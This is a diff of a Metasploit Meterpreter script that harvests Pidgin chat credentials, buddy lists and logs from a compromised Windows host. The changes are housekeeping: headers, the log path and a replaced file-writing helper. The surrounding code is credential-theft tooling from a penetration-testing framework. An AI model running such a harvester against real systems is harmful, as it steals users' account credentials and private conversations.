@@ -1,7 +1,7 @@
-##
 # $Id$
-##
-
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 require "rexml/document"
 
 #-------------------------------------------------------------------------------
@@ -42,9 +42,9 @@ end
 os = @client.sys.config.sysinfo['OS']
 host = @client.sys.config.sysinfo['Computer']
 # Create Filename info to be appended to downloaded files
-filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
+filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'im', host + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory,'scripts', 'pidgin_creds')
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
 #logfile name
@@ -176,16 +176,7 @@ def enum_users(os)
 	return users
 end
 #-------------------------------------------------------------------------------
-# Function for writing results of other functions to a file
-def filewrt(file2wrt, data2wrt)
-	output = ::File.open(file2wrt, "a")
-	if data2wrt
-		data2wrt.each_line do |d|
-			output.puts(d)
-		end
-	end
-	output.close
-end
+
 ################## MAIN ##################
 print_status("Running Meterpreter Pidgin Credential harvester script")
 print_status("All services are logged at #{dest}")
@@ -197,10 +188,10 @@ enum_users(os).each do |u|
 		print_status("Pidgin profile found!")
 		### modified to use pidgin_path
 		if get_credentials
-			filewrt(dest,extract_creds(pidgin_path))
+			file_local_write(dest,extract_creds(pidgin_path))
 		end
 		if get_buddies
-			filewrt(dest,extract_buddies(pidgin_path))
+			file_local_write(dest,extract_buddies(pidgin_path))
 			print_status("Buddie list has been saved to the log file.")
 		end
 		if get_logs
